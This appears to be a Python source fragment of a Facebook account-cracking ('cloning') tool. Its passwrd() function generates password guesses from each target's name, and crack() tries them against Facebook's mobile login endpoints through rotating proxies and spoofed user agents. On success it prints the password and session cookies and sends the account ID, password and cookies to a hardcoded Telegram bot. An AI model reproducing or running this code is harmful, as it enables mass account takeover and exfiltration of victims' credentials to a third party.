	hu = input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHOOSE : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[] 
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	linex()
	method.append('mobile')
	global cekap,askc,scp
	askc += input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m SHOW COOKIES : ')
	scp += input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m SHOW CHECKPOINT : ')
	passwrd()
	exit() 

#-------------------[ BAGIAN-WORDLIST ]------------#

def passwrd():
	os.system('clear')
	banner()
	info()
	print(f' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL SCANNABLE IDS    :',str(len(id)))
	print(" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
	linex()
	print(f' \x1b[38;5;196m>>\x1b[37m USE FLIGHT MODE EVERY 500 IDS ')
	linex()
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			pwv = []
			frs = nmf.split(' ')[0]
			try:
				lst = nmf.split(' ')[1]
			except:
				lst = ''
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+lst)
					pwv.append(frs+'@'+lst)
					pwv.append(frs+'#'+lst)
					pwv.append(lst+frs)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+lst+'123')
					pwv.append(frs+lst+'1234')
					pwv.append(frs+lst+'@123')
					pwv.append(frs+lst+'@1234')
					pwv.append(frs+lst+'321')
					pwv.append(lst+frs+'123')
					pwv.append(lst+frs+'111')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+lst)
					pwv.append(frs+'@'+lst)
					pwv.append(frs+'#'+lst)
					pwv.append(lst+frs)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+lst+'123')
					pwv.append(frs+lst+'1234')
					pwv.append(frs+lst+'@123')
					pwv.append(frs+lst+'@1234')
					pwv.append(frs+lst+'321')
					pwv.append(lst+frs+'123')
					pwv.append(lst+frs+'111')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'bapi' in method:
				pool.submit(bapi,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('\n\x1b[37m----------------------------------------------')
	print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CLONING COMPLETE AT '+time.strftime("%H:%M")+" "+ tag)
	print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m OK : %s '%(ok))
	print(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CP : %s '%(cp))
	linex()
	woi = input(' \x1b[38;5;196m>>\x1b[37m ENTER TO BACK')
	restart()

#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r {P}[ YOKIA ]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} • {pw} {P}')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {tahun(idf)} • {idf} • {pw} {P}')
				print('\x1b[38;5;46m [🍪] • '+kuki+'\x1b[37m')
				requests.get("https://api.telegram.org/bot6991664095:AAHbgeRrBJwvSOMEn0VABLSs-aJR4vRZZ-U/sendMessage?chat_id=5326153007&text= [•] "+idf+'|'+pw+'|'+kuki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#------------------[ METHODE-MBASIC-2 ]-------------------#
	

#-----------------------[ SYSTEM-CONTROL ]--------------------#

if __name__=='__main__':
	try:os.mkdir('/sdcard/HARRYv6')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()
